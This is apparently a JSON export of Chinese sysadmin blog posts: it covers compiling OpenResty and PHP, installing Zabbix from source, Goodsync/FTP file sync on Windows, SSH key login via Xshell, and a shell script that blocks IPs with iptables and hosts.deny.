[build] Error 2gmake[1]: Leaving directory `/root/soft/openresty-1.11.2.1/build/nginx-1.11.2’gmake: *** [all] Error 2主要原因是因为The OpenSSL API has changed quite a bit in 1.1.0… this means that nginx needs some work to adapt.openssl 1.1.0改变了太多，nginx暂时还不支持，版本换回1.0.x就行了。 编译安装1# gmake &amp;&amp; gmake install 为openresty提供启动脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134# vim /etc/init.d/nginx#!/bin/sh## nginx - this script starts and stops the nginx daemon## chkconfig: - 85 15 # description: Nginx is an HTTP(S) server, HTTP(S) reverse \\# proxy and IMAP/POP3 proxy server# processname: nginx# config: /usr/local/openresty/nginx/conf/nginx.conf# pidfile: /usr/local/openresty/nginx/logs/nginx.pid # Source function library.. /etc/rc.d/init.d/functions # Source networking configuration.. /etc/sysconfig/network # Check that networking is up.[ \"$NETWORKING\" = \"no\" ] &amp;&amp; exit 0 nginx=\"/usr/local/openresty/nginx/sbin/nginx\"prog=$(basename $nginx) NGINX_CONF_FILE=\"/usr/local/openresty/nginx/conf/nginx.conf\" [ -f /etc/sysconfig/nginx ] &amp;&amp; . /etc/sysconfig/nginx lockfile=/var/lock/subsys/nginx make_dirs() &#123; # make required directories user=`$nginx -V 2&gt;&amp;1 | grep \"configure arguments:\" | sed 's/[^*]*--user=\\([^ ]*\\).*/\\1/g' -` if [ -z \"`grep $user /etc/passwd`\" ]; then useradd -M -s /bin/nologin $user fi options=`$nginx -V 2&gt;&amp;1 | grep 'configure arguments:'` for opt in $options; do if [ `echo $opt | grep '.*-temp-path'` ]; then value=`echo $opt | cut -d \"=\" -f 2` if [ ! -d \"$value\" ]; then # echo \"creating\" $value mkdir -p $value &amp;&amp; chown -R $user $value fi fi done&#125; start() &#123; [ -x $nginx ] || exit 5 [ -f $NGINX_CONF_FILE ] || exit 6 make_dirs echo -n $\"Starting $prog: \" daemon $nginx -c $NGINX_CONF_FILE retval=$? echo [ $retval -eq 0 ] &amp;&amp; touch $lockfile return $retval&#125; stop() &#123; echo -n $\"Stopping $prog: \" killproc $prog -QUIT retval=$? echo [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile return $retval&#125; restart() &#123; configtest || return $? stop sleep 3 start&#125; reload() &#123; configtest || return $? echo -n $\"Reloading $prog: \" killproc $nginx -HUP RETVAL=$? echo&#125; force_reload() &#123; restart&#125; configtest() &#123; $nginx -t -c $NGINX_CONF_FILE&#125; rh_status() &#123; status $prog&#125; rh_status_q() &#123; rh_status &gt;/dev/null 2&gt;&amp;1&#125; case \"$1\" in start) rh_status_q &amp;&amp; exit 0 $1 ;; stop) rh_status_q || exit 0 $1 ;; restart|configtest) $1 ;; reload) rh_status_q || exit 7 $1 ;; force-reload) force_reload ;; status) rh_status ;; condrestart|try-restart) rh_status_q || exit 0 ;; *) echo $\"Usage: $0 &#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;\" exit 2esac# chmod +x /etc/init.d/nginx# chkconfig --add nginx# chkconfig nginx on 启动服务1# service nginx start 如果启动时报错：12# /usr/local/openresty/nginx/sbin/nginx /usr/local/openresty/nginx/sbin/nginx: error while loading shared libraries: libdrizzle.so.1: cannot open shared object file: No such file or directory 检查是否库文件不存在1# ldd $(which /usr/local/openresty/nginx/sbin/nginx) 结果发现确实1libdrizzle.so.1 =&gt; not found 检查/usr/local/{lib|lib64}目录下是否存在库文件，如果存在，则说明系统并没有加载库文件，我们需要手动指定系统加载。在/etc/ld.so.conf.d/目录下新建任何以.conf为后缀的文件，在该文件中加入库文件所在的目录。123# vim /etc/ld.so.conf.d/openresty.conf/usr/local/lib/usr/local/lib64 然后执行ldconfig更新/etc/ld.so.cache文件，解决问题。 如果需要隐藏openresty/nginx版本，只需要编辑nginx.conf，在http配置中添加以下配置即可解决。1server_tokens off; 2. 编译安装php 解决依赖关系1# yum install -y libxml2-devel bzip2-devel libcurl-devel gd-devel gmp-devel libmcrypt-devel 创建php安装位置1# mkdir /usr/local/php 创建php-fpm运行用户12# groupadd www# useradd www -g www -s /sbin/nologin 编译前配置1# ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-fpm-user=www --with-fpm-group=www --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --enable-ftp --enable-zip --with-bz2 --with-jpeg-dir --with-png-dir --with-freetype-dir --with-libxml-dir --with-xmlrpc --with-zlib-dir --with-gd --enable-gd-native-ttf --with-curl --enable-mbstring --enable-bcmath --enable-sockets --enable-exif --enable-fpm --with-mcrypt --with-mhash --with-gmp --enable-inline-optimization --with-openssl --with-pcre-dir --enable-soap --with-gettext 编译安装1# make &amp;&amp; make install 为php提供配置文件1# cp php.ini-production /usr/local/php/etc/php.ini 为php-fpm提供Sysv脚本并添加至服务列表设置开机启动1234# cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm# chmod +x /etc/init.d/php-fpm# chkconfig --add php-fpm# chkconfig php-fpm on 为php-fpm提供配置文件1# cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf 编辑php-fpm配置文件，按需修改配置1# vim /usr/local/php/etc/php-fpm.conf 启动php-fpm1# service php-fpm start 3. 配置openresty支持php修改nginx配置文件，启用php支持12345678910# vim /usr/local/openresty/nginx/conf/nginx.conf 启用下述配置 location ~ \\.php$ &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi.conf; &#125;","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Nginx/OpenResty","slug":"Linux/Nginx-OpenResty","permalink":"http://blog.unixmen.cn/categories/Linux/Nginx-OpenResty/"},{"name":"PHP","slug":"Linux/Nginx-OpenResty/PHP","permalink":"http://blog.unixmen.cn/categories/Linux/Nginx-OpenResty/PHP/"}],"tags":[{"name":"编译安装","slug":"编译安装","permalink":"http://blog.unixmen.cn/tags/编译安装/"},{"name":"openresty","slug":"openresty","permalink":"http://blog.unixmen.cn/tags/openresty/"},{"name":"php","slug":"php","permalink":"http://blog.unixmen.cn/tags/php/"}]},{"title":"编译安装Zabbix","slug":"zabbix+install","date":"2016-06-19T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/06/20/zabbix+install/","link":"","permalink":"http://blog.unixmen.cn/2016/06/20/zabbix+install/","excerpt":"\n前言：zabbix是一个基于WEB页面提供分布式系统监视以及网络监视功能的企业级开源解决方案。基于C/S架构，支持多种采集方式和采集客户端，有专用的Agent，也支持SNMP、IPMI、JMX、Telnet、SSH等多种协议，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上，它将采集到的数据存放到数据库，然后对其进行分析整理，达到条件触发告警。对于运维工作来说，zabbix是一个不可或缺的企业监控工具，本文主要出于学习的目的，对zabbix的编译安装做一下简单介绍，在日常业务环境中还是建议直接通过yum方式或者自己打包rpm方式安装。\n\n1.安装Zabbix-Server安装平台为CentOS 6.7，使用Zabbix版本为2.4.7，下载地址：http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/2.4.7/zabbix-2.4.7.tar.gz/download\n1.1 安装依赖包1# yum install -y gcc gcc-c++ autoconf httpd php mysql mysql-server php-mysql httpd-manual mod_ssl mod_perl mod_auth_mysql php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php-bcmath mysql-connector-odbc mysql-devel libdbi-dbd-mysql net-snmp-devel curl-devel unixODBC-devel OpenIPMI-devel java-devel\n此处，为了方便，使用的MySQL、PHP环境为yum安装，当然如果你出于学习考虑，也可以自己编译安装MySQL、PHP。\n1.2 配置PHP环境1234567# vim /etc/php.inidate.timezone =Asia/Shanghaimax_execution_time = 300post_max_size = 128Mmax_input_time = 300memory_limit = 128Mmbstring.func_overload = 2","text":"前言：zabbix是一个基于WEB页面提供分布式系统监视以及网络监视功能的企业级开源解决方案。基于C/S架构，支持多种采集方式和采集客户端，有专用的Agent，也支持SNMP、IPMI、JMX、Telnet、SSH等多种协议，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上，它将采集到的数据存放到数据库，然后对其进行分析整理，达到条件触发告警。对于运维工作来说，zabbix是一个不可或缺的企业监控工具，本文主要出于学习的目的，对zabbix的编译安装做一下简单介绍，在日常业务环境中还是建议直接通过yum方式或者自己打包rpm方式安装。 1.安装Zabbix-Server安装平台为CentOS 6.7，使用Zabbix版本为2.4.7，下载地址：http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/2.4.7/zabbix-2.4.7.tar.gz/download 1.1 安装依赖包1# yum install -y gcc gcc-c++ autoconf httpd php mysql mysql-server php-mysql httpd-manual mod_ssl mod_perl mod_auth_mysql php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php-bcmath mysql-connector-odbc mysql-devel libdbi-dbd-mysql net-snmp-devel curl-devel unixODBC-devel OpenIPMI-devel java-devel 此处，为了方便，使用的MySQL、PHP环境为yum安装，当然如果你出于学习考虑，也可以自己编译安装MySQL、PHP。 1.2 配置PHP环境1234567# vim /etc/php.inidate.timezone =Asia/Shanghaimax_execution_time = 300post_max_size = 128Mmax_input_time = 300memory_limit = 128Mmbstring.func_overload = 2 1.3 安装Zabbix-Server下载程序源码12# wget http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/2.4.7/zabbix-2.4.7.tar.gz/download依据自己的需要可以下载新版本，不过生产环境中不建议使用最新的版本 添加zabbix用户、组12# groupadd zabbix -g 201# useradd -g zabbix -u 201 -m zabbix 解压源码包1# tar zxvf zabbix-2.4.7.tar.gz 编译安装123456789101112# cd zabbix-2.4.7 # 此处根据你自己的程序版本号确定目录# ./configure --prefix=/usr --sysconfdir=/etc/zabbix --enable-server --enable-procy --enable-agent --enable-ipv6 --with-mysql=/usr/bin/mysql_config --with-net-snmp --with-libcurl -with-openipmi --with-unixodbc --with-ldap --with-ssh2 --enable-java此处如果是自己编译的MySQL，--with-mysql后要填写正确的路径。如果configure过程出现报错，可根据报错提示通过yum方式安装缺少的软件即可。如果出现报错：configure: error: SSH2 library not found只需yum install -y libssh2-devel安装这个依赖包就OK了。如果出现报错：configure: error: Invalid LDAP directory - unable to find ldap.h只需yum install -y openldap openldap-devel即可。出现Thank you for using Zabbix!提示的时候，代表configure检查通过# make &amp;&amp; make install 1.4 导入数据库创建zabbix相关数据库12345678910111213# pwd/root/zabbix-2.4.7# chkconfig mysqld on# service mysqld start# mysqladmin -uroot password &apos;1qazxsw2#&apos;第一次登陆MySQL的时候，需要指定MySQL root用户密码。# mysql -u root -pmysql&gt; create database zabbix character set utf8;此处注意，数据库字符集如果不是utf8，WEB界面改成中文时会出现乱码。mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;mysql&gt; flush privileges;# mysql -uzabbix -pzabbix zabbix测试zabbix数据库连接正常。 导入数据库1# mysql -uzabbix -pzabbix zabbix &lt; ./database/mysql/schema.sql 注意，如果只安装Proxy，则只导入schema.sql即可，无须导入下面的SQL，否则将导致Proxy无法正常工作。12# mysql -uzabbix -pzabbix zabbix &lt; ./database/mysql/images.sql # mysql -uzabbix -pzabbix zabbix &lt; ./database/mysql/data.sql 为zabbix创建日志文件夹12# mkdir /var/log/zabbix# chown -R zabbix:zabbix /var/log/zabbix/ 1.5 复制Service启动脚本12345# cp misc/init.d/fedora/core/zabbix_* /etc/init.d/# chmod 755 /etc/init.d/zabbix_*# sed -i &quot;s@BASEDIR=/usr/local@BASEDIR=/usr/@g&quot; /etc/init.d/zabbix_server # sed -i &quot;s@BASEDIR=/usr/local@BASEDIR=/usr/@g&quot; /etc/init.d/zabbix_agentd此处，如果编译前配置指定的安装路径为/usr/local则无须sed操作。 1.6 配置zabbix_server.conf服务器端文件路径：/etc/zabbix/zabbix_server.conf修改下列参数即可正常工作。123DBName=zabbixDBUser=zabbixDBPassword=zabbix 1.7 复制网页文件到Apache目录1234# pwd/root/zabbix-2.4.7# cp -r ./frontends/php/ /var/www/html/zabbix # chown -R apache:apache /var/www/html/zabbix/ 启动zabbix服务。123456# chkconfig zabbix_server on# chkconfig zabbix_agentd on# service zabbix_server start# service zabbix_agentd start# chkconfig httpd on# service httpd start 1.8 添加相应防火墙规则12345# iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT# iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 10050 -j ACCEPT# iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 10051 -j ACCEPT# iptables -A INPUT -m state --state NEW -m udp -p udp --dport 10050 -j ACCEPT# iptables -A INPUT -m state --state NEW -m udp -p udp --dport 10051 -j ACCEPT 关闭Selinux12# setenforce 0# vim /etc/selinux/config 至此，Zabbix的Server端安装完成。 1.9 配置Zabbix-Server前端UI打开浏览器，访问http://[IP]/zabbix，","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"http://blog.unixmen.cn/categories/Linux/Zabbix/"}],"tags":[{"name":"编译安装","slug":"编译安装","permalink":"http://blog.unixmen.cn/tags/编译安装/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.unixmen.cn/tags/zabbix/"},{"name":"监控","slug":"监控","permalink":"http://blog.unixmen.cn/tags/监控/"}]},{"title":"使用Goodsync+FTP实现简单的跨服务器数据同步","slug":"Goodsync+FTP+跨服务器数据同步","date":"2016-06-09T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/06/10/Goodsync+FTP+跨服务器数据同步/","link":"","permalink":"http://blog.unixmen.cn/2016/06/10/Goodsync+FTP+跨服务器数据同步/","excerpt":"\n前言近来，入职了一家新公司，公司是一家垂直电商平台，当前的业务量很小，服务器数量也不多，之前并没有专职运维，所以很多工作都得从零开始。目前的业务架构主要是.NET+WCF,其中后端两台WCF服务器（Windows）通过LVS来实现负载均衡，两台服务器上的程序文件一致；然而这两台服务器并没有使用共享存储的方式来确保数据一致，所以就造成了一个很痛苦的现实：每次发布程序更新的时候，我都需要在两台服务器上都操作一次，这样很没有必要，也很浪费时间。所以当务之急我需要解决两台WCF服务器数据不一致的问题。\n\n理想的状态应该是两台服务器配置共享存储，将程序文件放在共享存储上，这样可以确保两台服务器的程序文件完全一致。\n然而回到实际工作中，因为我们目前处于业务架构变更的阶段，整个线上业务将陆续放弃.NET环境，当前线上的.NET、WCF服务器也将在未来一段时间下线，所以从成本上考虑，使用共享存储并不实际；于是我开始考虑通过文件实时同步来实现两端程序文件一致。\n作为一个Linuxer，理所当然的第一时间想到了rsync，然而在进一步研究之后，我选择放弃rsync。因为在Windows环境中并没有一种很好的类似inotify的机制来配合rsync实现文件的实时监控，要实现文件的实时同步，需要自己写脚本通过计划任务来执行，这样就比较麻烦。\n在经过一番考量之后，忽然想起，在上家公司很久之前用过一款工具叫做Goodsync，还挺好用。于是又重新开始研究了一下，果然，Goodsync在Windows中简直是神器啊，配置简单，功能强大，支持通过FTP的方式传输数据，实时监控数据变化并同步变更后的数据，覆盖同步前先备份数据到特定目录，支持双向同步，这简直就是为我量身定制的。\n说干就干，下面就来详细写一下部署过程。","text":"前言近来，入职了一家新公司，公司是一家垂直电商平台，当前的业务量很小，服务器数量也不多，之前并没有专职运维，所以很多工作都得从零开始。目前的业务架构主要是.NET+WCF,其中后端两台WCF服务器（Windows）通过LVS来实现负载均衡，两台服务器上的程序文件一致；然而这两台服务器并没有使用共享存储的方式来确保数据一致，所以就造成了一个很痛苦的现实：每次发布程序更新的时候，我都需要在两台服务器上都操作一次，这样很没有必要，也很浪费时间。所以当务之急我需要解决两台WCF服务器数据不一致的问题。 理想的状态应该是两台服务器配置共享存储，将程序文件放在共享存储上，这样可以确保两台服务器的程序文件完全一致。 然而回到实际工作中，因为我们目前处于业务架构变更的阶段，整个线上业务将陆续放弃.NET环境，当前线上的.NET、WCF服务器也将在未来一段时间下线，所以从成本上考虑，使用共享存储并不实际；于是我开始考虑通过文件实时同步来实现两端程序文件一致。 作为一个Linuxer，理所当然的第一时间想到了rsync，然而在进一步研究之后，我选择放弃rsync。因为在Windows环境中并没有一种很好的类似inotify的机制来配合rsync实现文件的实时监控，要实现文件的实时同步，需要自己写脚本通过计划任务来执行，这样就比较麻烦。 在经过一番考量之后，忽然想起，在上家公司很久之前用过一款工具叫做Goodsync，还挺好用。于是又重新开始研究了一下，果然，Goodsync在Windows中简直是神器啊，配置简单，功能强大，支持通过FTP的方式传输数据，实时监控数据变化并同步变更后的数据，覆盖同步前先备份数据到特定目录，支持双向同步，这简直就是为我量身定制的。 说干就干，下面就来详细写一下部署过程。 部署FTP服务因为Goodsync支持通过FTP的方式来实现数据同步传输，而且FTP的配置相对简单，所以在此例中我选择部署FTP。为了方便配置，同时也因为Windows自带FTP配置麻烦，所以FTP Server我选择Filezilla Server，Filezilla是一款开源免费的FTP软件，也是一款神奇，具体的我就不多介绍了，总之也是一款神器。 Filezilla的安装十分简单，因此略过安装过程，仅展示下相关的服务器配置。 在安装文件夹中双击“FileZilla Server Interface.exe”，进入控制台，然后点击“编辑”→“设置”，打开配置页面。 a.点击“ip绑定”，修改绑定IP。此处，对话框中填写“*”则代表绑定服务器所有IP，也就意味着可以通过服务器上配置的所有IP来访问FTP，而出于安全考虑，我们仅希望通过内网来访问FTP，所以我们绑定内网IP地址b.点击“日志”，勾选“记录日志到文件”开启日志记录，同时为了便于日志管理，我们设置每天记录日志到一个文件并删除30天前的日志文件。c.点击“自动禁止”，勾选“启用自动禁止”，启用FTP安全设置。 创建FTP用户密码。添加共享文件夹此处添加你需要同步的文件夹即可。 最后，为了服务器的安全，我们应该适当的做一下安全设置。打开服务器“高级安全防火墙”选项，选择“入站规则”，新建一条规则。选择“端口”，点击下一步。选择“TCP”，在“本地特定端口”中填写21，以使端口作用于FTP 21端口，然后点击下一步。选择“允许连接”，点击下一步，下一个页面默认设置，然后点击点一步。自定义名称、描述。在入站规则列表，双击打开新建的入站规则FTP。在打开的选项卡中选择“作用域”，在“远程IP地址”栏中添加允许访问的IP，然后确认退出。FTP部署完成。 部署Goodsync因为通过FTP可以实现文件上传下载，所以我们无需在另外一台服务器上部署FTP服务，我们在第二台服务器上部署Goodsync服务，然后Goodsync通过FTP连接第一台服务器，从而实现数据实时同步。 安装过程比较简单，就不多啰嗦了；不过有一点需要注意，在安装完成后，第一次启动时会跳出一个对话框“GoodSync Connect安装”，此处选择不安装。 下面开始配置GoodSync。a.新建任务，任务名称可以自定义，此处我们根据业务命名为“service-sync”，任务类型选择同步，点击确定后弹出配置界面。b.点击“工具”，选择“程序选项”，勾选“系统启动时运行GoodSync”，然后保存退出。c.点击“任务”，选择“选项”，开始配置同步任务。d.参照下图，配置“常规”选项。e.参照下图，配置“自动”选项。f.参照下图，配置“已预置”选项。g.其它选项默认设置，然后保存退出。 以上设置仅完成同步参数设置，接下来我们要配置最重要的一步，指定同步两端文件夹。 指定左侧文件夹在主配置界面，点击左侧的“浏览”，在弹出的“左侧文件夹”选项卡中选择本地需要同步的文件夹，然后点击“OK”保存退出。 。 指定右侧文件夹在主配置界面，点击右侧的“浏览”，因为本次方案中我们采用FTP的方式来实现两端同步，故应在弹出的“右侧文件夹”选项卡中选择FTP，在右侧填写相应的FTP地址、用户名密码，点击右侧“更多”，勾选“主动FTP模式”，在下面的框中选中对端需要同步的文件夹，然后点击“OK”保存退出。 至此同步配置完成。","raw":null,"content":null,"categories":[{"name":"Windows","slug":"Windows","permalink":"http://blog.unixmen.cn/categories/Windows/"},{"name":"Goodsync","slug":"Windows/Goodsync","permalink":"http://blog.unixmen.cn/categories/Windows/Goodsync/"}],"tags":[{"name":"Goodsync","slug":"Goodsync","permalink":"http://blog.unixmen.cn/tags/Goodsync/"},{"name":"跨服务器","slug":"跨服务器","permalink":"http://blog.unixmen.cn/tags/跨服务器/"},{"name":"数据同步","slug":"数据同步","permalink":"http://blog.unixmen.cn/tags/数据同步/"}]},{"title":"使用Xshell来配置Linux服务器key认证登录","slug":"Xshell+Linux-key","date":"2016-05-16T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/05/17/Xshell+Linux-key/","link":"","permalink":"http://blog.unixmen.cn/2016/05/17/Xshell+Linux-key/","excerpt":"\n前言在Linux运维工作中，当所负责维护的服务器规模达到一定程度后，管理大量的登录密码成为了一件非常麻烦的事，同时使用密码登录也存在被暴力破解的风险。\n\n\n那么如何才能保证在不影响安全性的前提下提高运维工作效率呢，其实我们可以采用SSH-KEY认证的方式来实现免密码登录。在业务允许的前提下，我们可以很容易做到一套SSH-KEY管理所有服务器，从此告别繁琐的密码管理，节省大量时间，可以与白富美谈谈人生理想什么的也是极好的。\n\n1.SSH-KEY认证的原理简介在谈及如何配置SSH-KEY认证前，有必要花费少量篇幅来讲一讲SSH-KEY认证的原理，这样更有助于我们快速部署SSH-KEY认证。所谓的密钥认证，实际上是使用一对加密字符串，一个称为公钥(public key)，任何人都可以看到其内容，用于加密；另一个称为密钥(private key)，只有拥有者才能看到，用于解密。通过公钥加密过的密文使用密钥可以轻松解密，但根据公钥来猜测密钥却十分困难。ssh 的密钥认证就是使用了这一特性。服务器和客户端都各自拥有自己的公钥和密钥。在认证之前，将公钥上传到服务器，然后客户端使用密钥就可以顺利通过认证，登录服务器执行相关操作，整个过程无须输入密码，方便快捷。\n2.使用Xshell客户端生成KEY生成KEY的方式有很多种，其中在Linux系统下可以使用ssh-keygen -t rsa命令来生成KEY；同时目前市面上常见的SSH客户端工具（Xshell、SecureCRT、Putty等）都支持生成KEY。\n本文由于作者个人习惯，采用Xshell客户端来生成KEY。","text":"前言在Linux运维工作中，当所负责维护的服务器规模达到一定程度后，管理大量的登录密码成为了一件非常麻烦的事，同时使用密码登录也存在被暴力破解的风险。 那么如何才能保证在不影响安全性的前提下提高运维工作效率呢，其实我们可以采用SSH-KEY认证的方式来实现免密码登录。在业务允许的前提下，我们可以很容易做到一套SSH-KEY管理所有服务器，从此告别繁琐的密码管理，节省大量时间，可以与白富美谈谈人生理想什么的也是极好的。 1.SSH-KEY认证的原理简介在谈及如何配置SSH-KEY认证前，有必要花费少量篇幅来讲一讲SSH-KEY认证的原理，这样更有助于我们快速部署SSH-KEY认证。所谓的密钥认证，实际上是使用一对加密字符串，一个称为公钥(public key)，任何人都可以看到其内容，用于加密；另一个称为密钥(private key)，只有拥有者才能看到，用于解密。通过公钥加密过的密文使用密钥可以轻松解密，但根据公钥来猜测密钥却十分困难。ssh 的密钥认证就是使用了这一特性。服务器和客户端都各自拥有自己的公钥和密钥。在认证之前，将公钥上传到服务器，然后客户端使用密钥就可以顺利通过认证，登录服务器执行相关操作，整个过程无须输入密码，方便快捷。 2.使用Xshell客户端生成KEY生成KEY的方式有很多种，其中在Linux系统下可以使用ssh-keygen -t rsa命令来生成KEY；同时目前市面上常见的SSH客户端工具（Xshell、SecureCRT、Putty等）都支持生成KEY。 本文由于作者个人习惯，采用Xshell客户端来生成KEY。 2.1 打开Xshell客户端，在“工具”选项卡选择“新建用户密钥生成向导”2.2 点击选择之后，弹出的对话框中有两个下拉菜单；“密钥类型”我们选择默认的“RSA”，“密钥长度”下拉菜单中有6个选项“768/1024/2048/2072/4096/8192”，这里我们也默认选择“2048”（这里如果选择的密钥长度过长，将影响登录认证时间），然后选择下一步。2.3 自动生成公钥和私钥对，点击下一步继续。2.4 弹出“用户密钥信息”对话框，在这里我们可以给密钥命名，我这里选择命名为“server_rsa”，同时可以为密钥对设置密码保护，这样可以在密钥认证的基础上多一道防护，在这里我建议设置密钥保护密码，可以确保在密钥不慎泄露的情况下多一层保障；点击下一步继续。2.5 弹出的对话框中，有一项“公钥格式”，我们选择默认的“SSH2-OPENSSH”即可；点击右下角的“保存为文件”将生成的公钥导出，导出的文件格式为.pub文件。 3.在服务端注册公钥只生成密钥对，只不过是一个开始，要想实现KEY认证登录，还需要将生成的公钥在服务端注册。 3.1 将前面操作中导出的server_rsa.pub上传到服务器/home/user/.ssh/目录中，其中/home/user/为你希望用来登录的用户名；此处我们做的是root用户的KEY认证，所以我们需要上传到/root/.ssh/目录下（如果.ssh目录不存在，则手动创建之）3.2 注册公钥注册公钥其实就是将server_rsa.pub文件中的内容导入到authorized_keys文件中（至于为什么要这么做，后文我会解释），我们可以使用如下命令：123# mv server_rsa.pub authorized_keys也可以使用# cat server_rsa.pub &gt;&gt; authorized_keys 3.3 修改权限，确保.ssh目录属主为当前用户且权限为700；确保文件authorized_keys属主为当前用户且权限为600，否则将无法认证登录。 /home/user/目录权限也必须为700，否则将无法正常认证登录（root用户可以无视）！ 4.修改SSH配置文件，启用KEY认证登录编辑SSH配置文件1234# vim /etc/ssh/sshd_configPubkeyAuthentication yes #启用KEY认证AuthorizedKeysFile .ssh/authorized_keys #此处指定认证公钥文件，所以前面我们要把server_rsa.pub文件中的内容导入到authorized_keys文件中 5.测试KEY认证登录打开Xshell客户端，新建会话，在打开的对话框左侧栏中选择“用户身份验证”，“方法”选择“Public Key”，“用户名”填写注册公钥时选择的用户，此处填写root，“用户密钥”选择我们生成的“server_rsa”，“密码”填写我们生成密钥对时设置的保护密码。设置完成，点击“确定”、“完成”即可。 6.修改SSH配置文件，关闭SSH密码登录测试KEY认证登录后，为了安全起见，我们可以选择关闭SSH密码登录，仅允许KEY认证登录。编辑SSH配置文件12345678# vim /etc/ssh/sshd_config# To disable tunneled clear text passwords, change to no here!#PasswordAuthentication yes#PermitEmptyPasswords noPermitEmptyPasswords no#PasswordAuthentication yesPasswordAuthentication no #此处将yes修改为no，即可关闭密码登录，注释此行是无效的，不要问我怎么知道的 我们再来使用Xshell客户端连接服务器的时候会发现，Password那一项为灰色不可选状态。 至此，我们实现了SSH-KEY认证免密码登录（其实还是要输密码的，只是无需输入系统用户密码） 如果我们还有其他服务器需要设置SSH-KEY认证，只需将上面生成的公钥文件上传到相应服务器，并依照上述操作步骤注册公钥即可，这样就可以实现一个密钥对管理多台服务器了。 7.一点安全建议使用SSH-KEY认证登陆，最好不要去设置root的密钥认证，可以通过其他用户使用su或者sudo获得超级管理员权限，这样可以保证系统安全。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"}],"tags":[{"name":"Xshell","slug":"Xshell","permalink":"http://blog.unixmen.cn/tags/Xshell/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/tags/Linux/"},{"name":"key认证","slug":"key认证","permalink":"http://blog.unixmen.cn/tags/key认证/"}]},{"title":"一个关于屏蔽恶意IP的shell脚本","slug":"block_ip_shell","date":"2015-12-20T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2015/12/21/block_ip_shell/","link":"","permalink":"http://blog.unixmen.cn/2015/12/21/block_ip_shell/","excerpt":"最近，因为工作上的需求，需要写一个脚本来实现用户输入一个IP，然后自动添加到iptables拒绝列表以及hosts.deny文件中，以实现拦截恶意IP访问的目的。因为之前写过一个功能简单的脚本，为了省事就直接拿过来改了改，主要想实现以下几点需求：1.拒绝IP访问：提示用户输入一个IP，然后将此IP添加到iptables拒绝列表，同时将此IP添加到hosts.deny文件中，实现拒绝IP访问。2.查找IP是否被拒绝并提示用户是否删除：提示用户输入一个IP，然后查询此IP是否存在于iptables拒绝列表、hosts.deny文件、route list，将查询结果输出到屏幕；同时输出一个选项菜单，让用户选择是否从拒绝列表中删除IP。","text":"最近，因为工作上的需求，需要写一个脚本来实现用户输入一个IP，然后自动添加到iptables拒绝列表以及hosts.deny文件中，以实现拦截恶意IP访问的目的。因为之前写过一个功能简单的脚本，为了省事就直接拿过来改了改，主要想实现以下几点需求：1.拒绝IP访问：提示用户输入一个IP，然后将此IP添加到iptables拒绝列表，同时将此IP添加到hosts.deny文件中，实现拒绝IP访问。2.查找IP是否被拒绝并提示用户是否删除：提示用户输入一个IP，然后查询此IP是否存在于iptables拒绝列表、hosts.deny文件、route list，将查询结果输出到屏幕；同时输出一个选项菜单，让用户选择是否从拒绝列表中删除IP。 早前的脚本只有添加拒绝IP和查询IP是否被拒绝这两个功能，并无查询后删除的功能，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/bin/bash##version: 1.0.1#by: lucissfer#date: 2015-02-26 05:00echo &quot;The defined Options are:&quot;echo &quot; 1: Drop IP to blocklist&quot;echo &quot; 2: Find ip from the blocklist&quot;echo &quot; Any other character (except 1,2) exits&quot;read -p &quot;Select Options (1-2): &quot; optionif [ &quot;$option&quot; == &quot;1&quot; ]then read -p &quot;Please Input IP address: &quot; ip iptables -I INPUT -s $ip -j DROP echo -e &quot;\\033[31m$ip\\033[0m already be dropped !!!!&quot; exitelif [ &quot;$option&quot; == &quot;2&quot; ]then read -p &quot;Please Input IP address: &quot; IP iptables -nvL --line | grep $IP &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\n&quot; echo -e &quot;\\033[32miptables: \\033[0m&quot; iptables -nvL --line | grep $IP else echo -e &quot;\\n&quot; echo -e &quot;\\033[32miptables:\\033[0m \\n\\033[31mDoes not exist!!!\\033[0m&quot; fi cat /etc/hosts.deny | grep $IP &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\n&quot; echo -e &quot;\\033[32mhosts.deny: \\033[0m&quot; cat /etc/hosts.deny | grep $IP else echo -e &quot;\\n&quot; echo -e 